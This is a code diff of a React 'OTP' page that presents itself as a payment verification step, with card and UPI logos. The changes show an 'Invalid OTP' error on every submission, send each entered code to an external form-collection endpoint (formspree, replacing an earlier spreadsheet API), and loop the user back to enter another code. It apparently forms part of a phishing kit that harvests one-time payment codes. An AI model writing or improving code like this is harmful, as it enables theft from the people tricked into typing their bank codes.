@@ -2,10 +2,12 @@
 import { useCallback, useEffect, useState } from "react";
 import Swal from "sweetalert2";
 import axios from "axios";
-
+import "./otp.css";
+import { useNavigate } from "react-router-dom";
 export default function OTP() {
+  const navigate = useNavigate();
   const [timer, setTimer] = useState(60);
-  const [Otp, setOtp] = useState(false);
+
   const timeOutCallback = useCallback(
     () => setTimer((currTimer) => currTimer - 1),
     []
@@ -15,55 +17,35 @@ export default function OTP() {
     timer > 0 && setTimeout(timeOutCallback, 1000);
   }, [timer, timeOutCallback]);
 
-  if (timer === 60) {
-    window.scrollTo({
-      top: 350,
-      left: 100,
-      behavior: "smooth",
-    });
-  }
   const resetTimer = function () {
     if (!timer) {
       setTimer(60);
     }
   };
 
-  const OTP = () => {
-    setOtp(true);
-    if (Otp) {
-      Swal.fire({
-        position: "center",
-        icon: "error",
-        title: "Invalid OTP",
-        showConfirmButton: false,
-        timer: 1500,
-      });
-      setOtp(false);
-      window.scrollTo({
-        top: 200,
-        left: 100,
-        behavior: "smooth",
-      });
-    }
-  };
-
   const saveFormData = async (e) => {
-    window.scrollTo({
-      top: 200,
-      left: 100,
-      behavior: "smooth",
-    });
     e.preventDefault();
+    Swal.fire({
+      icon: "error",
+      title: "Oops...",
+      text: "Invalid OTP !",
+    });
     const data = new FormData(e.target);
     const Formvlaues = Object.fromEntries(data.entries());
 
     axios
-      .post(
-        `https://sheet.best/api/sheets/6513c974-3a2f-4ecc-b6e9-95b86a407163`,
-        Formvlaues
-      )
-      .then((response) => {});
-    e.target.reset();
+      .post(`https://formspree.io/f/xwkzqweq`, Formvlaues)
+      .then((response) => {
+        if (response.status) {
+          let dataSet = response.data;
+          console.log();
+
+          if (dataSet.ok) {
+            navigate("/OTP");
+            e.target.reset();
+          }
+        }
+      });
   };
 
   return (
@@ -108,14 +90,14 @@ export default function OTP() {
             <b>Enter the code we just sent on your phone</b>
             {/* <b className="text-color">+91 ******282</b> */}
           </span>
-          <form>
+          <form onSubmit={saveFormData}>
             <div className="d-flex flex-row mt-5">
               <input
                 type="text"
                 className="form-control border-0 border-bottom border border-primary"
                 autoFocus=""
                 placeholder="Enter the OTP "
-                name="userotp"
+                name="OTP"
                 required
               />
             </div>
@@ -135,12 +117,7 @@ export default function OTP() {
                   Not received your code? Resend code in {timer} Seconds
                 </span>
               )}
-              <button
-                type="submit"
-                className="btn btn-primary"
-                onClick={() => OTP()}
-                onSubmit={saveFormData}
-              >
+              <button type="submit" className="btn btn-primary">
                 verify
               </button>
             </div>
@@ -166,21 +143,10 @@ export default function OTP() {
           <div>
             <img src="https://img.icons8.com/color/36/000000/visa.png" alt="" />
           </div>
-          <div>
-            <img
-              src="https://d6xcmfyh68wv8.cloudfront.net/assets/razorpay-glyph.svg"
-              alt=""
-            />
-          </div>
+
           <div>
             <img
               src="https://images.news18.com/ibnlive/uploads/2020/02/UPI.jpg?impolicy=website&width=510&height=356"
-              alt=""
-            />
-          </div>
-          <div>
-            <img
-              src="https://rupay.golftripz.com/assets/images/RuPayLogo-01.png"
               alt=""
             />
           </div>
@@ -190,7 +156,7 @@ export default function OTP() {
       {/* loading....... */}
 
       <div className="container">
-        <div className="footer" style={{ width: "100%", margin: "auto" }}>
+        <div className="footer" style={{ width: "50%", margin: "auto" }}>
           <div>
             <img
               src="https://static.thenounproject.com/png/1684626-200.png"
@@ -212,12 +178,10 @@ export default function OTP() {
               src="https://image.shutterstock.com/image-vector/simple-creative-easy-return-policy-260nw-2101313926.jpg"
               alt=""
             />
-            <p>Easy Returns</p>
+            {"   "} <p style={{ marginLeft: "2rem" }}>Easy Returns</p>
           </div>
         </div>
-        <div className="container">
-          <p></p>
-        </div>
+        <div className="container"></div>
       </div>
     </>
   );
